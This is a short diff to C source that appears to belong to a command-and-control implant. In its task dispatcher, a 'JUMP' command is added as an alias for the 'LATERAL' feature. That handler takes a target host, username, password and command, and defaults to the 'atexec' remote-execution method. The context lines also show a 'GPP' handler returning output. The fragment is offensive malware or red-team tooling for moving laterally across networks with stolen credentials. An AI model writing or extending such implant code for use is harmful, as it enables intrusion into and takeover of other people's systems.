@@ -2452,7 +2452,7 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id,gpp_out,""); free(gpp_out);
     }
     // ── FEATURE 10: LATERAL ──────────────────────────────────────────────────
-    else if (strcmp(type_upper, "LATERAL") == 0) {
+    else if (strcmp(type_upper, "LATERAL") == 0 || strcmp(type_upper, "JUMP") == 0) {
         char lat_method[32]={0},lat_host[256]={0},lat_user[256]={0};
         char lat_pass[256]={0},lat_cmd[1024]={0};
         json_get_str(args,"method",lat_method,sizeof(lat_method),"atexec");
